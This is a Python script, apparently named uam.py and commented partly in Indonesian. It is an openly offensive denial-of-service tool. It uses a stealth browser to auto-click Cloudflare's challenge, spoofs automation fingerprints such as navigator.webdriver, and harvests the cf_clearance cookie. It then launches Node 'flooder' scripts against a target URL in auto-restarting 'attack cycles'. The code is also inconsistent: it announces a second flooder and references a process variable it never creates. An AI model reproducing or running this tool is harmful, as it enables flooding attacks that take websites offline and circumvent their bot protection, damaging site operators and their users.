import asyncio
import subprocess
import sys
import random
import time
import threading
from dataclasses import dataclass
from typing import Any, Dict

from camoufox.async_api import AsyncCamoufox
from browserforge.fingerprints import Screen
from colorama import init, Fore, Style

init(autoreset=True)

@dataclass
class CloudflareCookie:
    name: str
    value: str
    domain: str
    path: str
    expires: int
    http_only: bool
    secure: bool
    same_site: str

    @classmethod
    def from_json(cls, cookie_data: Dict[str, Any]) -> "CloudflareCookie":
        return cls(
            name=cookie_data.get("name", ""),
            value=cookie_data.get("value", ""),
            domain=cookie_data.get("domain", ""),
            path=cookie_data.get("path", "/"),
            expires=cookie_data.get("expires", 0),
            http_only=cookie_data.get("httpOnly", False),
            secure=cookie_data.get("secure", False),
            same_site=cookie_data.get("sameSite", "Lax"),
        )

class CloudflareSolver:
    def __init__(self, sleep_time=3, headless=True, os=None, debug=False, retries=10):
        self.cf_clearance = None
        self.sleep_time = sleep_time
        self.headless = headless
        self.os = os or ["windows"]
        self.debug = debug
        self.retries = retries

    async def _find_and_click_challenge_frame(self, page):
        for frame in page.frames:
            if frame.url.startswith("https://challenges.cloudflare.com"):
                frame_element = await frame.frame_element()
                box = await frame_element.bounding_box()
                checkbox_x = box["x"] + box["width"] / 9
                checkbox_y = box["y"] + box["height"] / 2

                await asyncio.sleep(random.uniform(1.5, 2.5))
                await page.mouse.click(x=checkbox_x, y=checkbox_y)
                return True
        return False

    async def solve(self, link: str):
        try:
            print(f"{Fore.GREEN}[info]{Style.RESET_ALL} Browser started")
            async with AsyncCamoufox(
                headless=self.headless,
                os=self.os,
                screen=Screen(max_width=1920, max_height=1080),
                args=[
                    "--disable-blink-features=AutomationControlled",
                    "--no-sandbox",
                    "--disable-dev-shm-usage",
                    "--disable-infobars",
                    "--start-maximized",
                    "--lang=en-US,en;q=0.9",
                    "--disable-blink-features",
                    "--disable-web-security",
                    "--disable-features=IsolateOrigins,site-per-process",
                    "--window-size=1920,1080",
                ]
            ) as browser:
                page = await browser.new_page()
                await asyncio.sleep(random.uniform(1, 2))

                await page.goto(link)
                await asyncio.sleep(random.uniform(1.5, 2.5))

                await page.add_init_script("""
                Object.defineProperty(navigator, 'webdriver', { get: () => false });
                """)

                await page.evaluate("""
                () => {
                    Object.defineProperty(navigator, 'platform', { get: () => 'Win32' });
                    Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
                    Object.defineProperty(navigator, 'plugins', { get: () => [1,2,3,4,5] });
                }
                """)

                title = await page.title()
                print(f"{Fore.YELLOW}[info]{Style.RESET_ALL} Navigated: {title}")

                for _ in range(self.retries):
                    if await self._find_and_click_challenge_frame(page):
                        await asyncio.sleep(random.uniform(2, 3.0))
                        break
                    await asyncio.sleep(random.uniform(1, 1.5))

                await asyncio.sleep(random.uniform(1, 2))
                solved_title = await page.title()
                print(f"{Fore.YELLOW}[info]{Style.RESET_ALL} Solved title: {solved_title}")

                cookies = await page.context.cookies()
                ua = await page.evaluate("() => navigator.userAgent")

                cf_cookie = next((c for c in cookies if c["name"] == "cf_clearance"), None)
                if cf_cookie:
                    self.cf_clearance = CloudflareCookie.from_json(cf_cookie)
                    print(f"{Fore.GREEN}[solver]{Style.RESET_ALL} Cookie: {self.cf_clearance.value}")
                else:
                    print(f"{Fore.RED}[solver]{Style.RESET_ALL} cf_clearance not found")
                    return None, None

                print(f"{Fore.GREEN}[solver]{Style.RESET_ALL} User-Agent: {ua}")
                print(f"{Fore.YELLOW}[info]{Style.RESET_ALL} Browser stopped")
                await asyncio.sleep(random.uniform(0.8, 1.2))

                return self.cf_clearance.value, ua

        except Exception as e:
            print(f"{Fore.RED}[error]{Style.RESET_ALL} Error solving {link} - {e}")
            return None, None

async def run_attack_cycle(url: str, duration: int, cycle_num: int):
    """Jalankan satu siklus attack"""
    print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║               ATTACK CYCLE #{cycle_num} STARTED               ║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    solver = CloudflareSolver()
    max_attempts = 10
    cookie = None
    ua = None

    for attempt in range(1, max_attempts + 1):
        print(f"{Fore.CYAN}[attempt]{Style.RESET_ALL} Attempt {attempt} to solve Cloudflare")
        cookie, ua = await solver.solve(url)
        if cookie and ua:
            break
        print(f"{Fore.RED}[retry]{Style.RESET_ALL} Retry after failure...")

    if not cookie or not ua:
        print(f"{Fore.RED}[error]{Style.RESET_ALL} Failed to solve Cloudflare after {max_attempts} attempts")
        return False

    print(f"[*] cf_clearance: {cookie[:30]}...")
    print(f"[*] User-Agent: {ua[:50]}...")
    print(f"[*] Starting flooder for {duration} seconds...\n")

    parcok = f"cf_clearance={cookie}"

    # ========== JALANKAN 2 FLOODER SEKALIGUS ==========
    args1 = [
        "node", "yaya.js", 
        url, 
        str(duration), 
        parcok, 
        ua
    ]
    
    proc1 = subprocess.Popen(
        args1,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )
    
    print(f"{Fore.GREEN}[+] Flooder 1 (yaya.js) started{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Flooder 2 (ya.js) started{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[+] Both flooders running simultaneously!{Style.RESET_ALL}\n")

    def read_output(proc, name):
        for line in proc.stdout:
            print(f"[{name}] {line}", end='')
        proc.wait()

    thread1 = threading.Thread(target=read_output, args=(proc1, "yaya"))
    thread2 = threading.Thread(target=read_output, args=(proc2, "ya"))
    
    thread1.start()
    
    thread1.join()
    
    print(f"{Fore.GREEN}[✓] Cycle #{cycle_num} completed{Style.RESET_ALL}")
    return True

async def main(url: str, duration: int, auto_restart: bool = True, delay: int = 5):
    """Main function dengan auto restart"""
    
    cycle_num = 1
    
    print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║              AUTO-RESTART ATTACK SYSTEM                 ║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    print(f"{Fore.WHITE}Target: {url}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}Duration per cycle: {duration}s{Style.RESET_ALL}")
    print(f"{Fore.WHITE}Auto-restart: {auto_restart}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}Delay between cycles: {delay}s{Style.RESET_ALL}")
    print("")
    
    while True:
        success = await run_attack_cycle(url, duration, cycle_num)
        
        if not auto_restart:
            break
            
        if success:
            cycle_num += 1
            print(f"\n{Fore.YELLOW}[system]{Style.RESET_ALL} Waiting {delay} seconds before next cycle...")
            await asyncio.sleep(delay)
        else:
            print(f"\n{Fore.RED}[system]{Style.RESET_ALL} Cycle failed, retrying in {delay} seconds...")
            await asyncio.sleep(delay)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"{Fore.RED}Usage:{Style.RESET_ALL} python3 uam.py <url> <duration> [auto_restart] [delay]")
        print(f"{Fore.YELLOW}Examples:{Style.RESET_ALL}")
        print(f"  python3 uam.py https://target.com 300           # 1 cycle")
        print(f"  python3 uam.py https://target.com 300 true      # auto restart")
        print(f"  python3 uam.py https://target.com 300 true 10   # auto restart with 10s delay")
        sys.exit(1)

    url = sys.argv[1]
    try:
        duration = int(sys.argv[2])
    except ValueError:
        print(f"{Fore.RED}Error:{Style.RESET_ALL} Durasi harus angka")
        sys.exit(1)

    auto_restart = len(sys.argv) > 3 and sys.argv[3].lower() == 'true'
    delay = int(sys.argv[4]) if len(sys.argv) > 4 else 5

    asyncio.run(main(url, duration, auto_restart, delay))